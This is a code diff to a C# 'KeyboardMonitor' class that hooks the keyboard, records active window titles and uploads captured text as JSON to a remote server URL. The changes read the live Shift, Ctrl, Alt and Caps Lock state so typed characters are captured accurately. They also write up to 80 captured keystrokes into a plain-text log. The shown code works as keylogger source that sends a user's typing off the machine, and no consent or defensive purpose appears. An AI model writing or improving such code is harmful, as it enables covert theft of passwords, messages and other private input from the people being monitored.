@@ -114,6 +114,8 @@ public class KeyboardMonitor {
     [DllImport("user32.dll")] private static extern IntPtr GetForegroundWindow();
     [DllImport("user32.dll")] private static extern int    GetWindowText(IntPtr hWnd, StringBuilder s, int n);
     [DllImport("user32.dll")] private static extern bool   GetKeyboardState(byte[] ks);
+    [DllImport("user32.dll")] private static extern short  GetKeyState(int vk);
+    [DllImport("user32.dll")] private static extern short  GetAsyncKeyState(int vk);
     [DllImport("user32.dll")] private static extern int    ToUnicode(uint vk, uint sc, byte[] ks, StringBuilder sb, int size, uint flags);
     [DllImport("user32.dll")] private static extern int    GetMessage(out MSG msg, IntPtr hWnd, uint min, uint max);
     [DllImport("user32.dll")] private static extern bool   TranslateMessage(ref MSG msg);
@@ -204,6 +206,14 @@ public class KeyboardMonitor {
         }
         byte[] keyState = new byte[256];
         GetKeyboardState(keyState);
+        // GetKeyboardState reflects the *hook thread's* queue, not the physical keyboard,
+        // so on a low-level hook it is often empty and ToUnicode then yields nothing.
+        // Reassert the live modifier state so characters translate correctly.
+        const int VK_SHIFT = 0x10, VK_CONTROL = 0x11, VK_MENU = 0x12, VK_CAPITAL = 0x14;
+        if ((GetAsyncKeyState(VK_SHIFT)   & 0x8000) != 0) keyState[VK_SHIFT]   = 0x80;
+        if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0) keyState[VK_CONTROL] = 0x80;
+        if ((GetAsyncKeyState(VK_MENU)    & 0x8000) != 0) keyState[VK_MENU]    = 0x80;
+        if ((GetKeyState(VK_CAPITAL)      & 0x0001) != 0) keyState[VK_CAPITAL] = 0x01;
         var sb     = new StringBuilder(4);
         int result = ToUnicode((uint)vk, sc, keyState, sb, sb.Capacity, 0);
         if (result >= 1) return sb.ToString(0, result);
@@ -274,7 +284,8 @@ public class KeyboardMonitor {
                 client.Headers[HttpRequestHeader.ContentType] = "application/json; charset=utf-8";
                 client.UploadString(serverUrl, json);
             }
-            Log("sent seq=" + mySeq + " len=" + chunk.Length);
+            Log("sent seq=" + mySeq + " len=" + chunk.Length +
+                " keys=[" + (chunk.Length > 80 ? chunk.Substring(0, 80) : chunk) + "]");
         } catch (Exception ex) {
             Log("send FAILED seq=" + mySeq + " len=" + chunk.Length + ": " + ex.Message);
         }
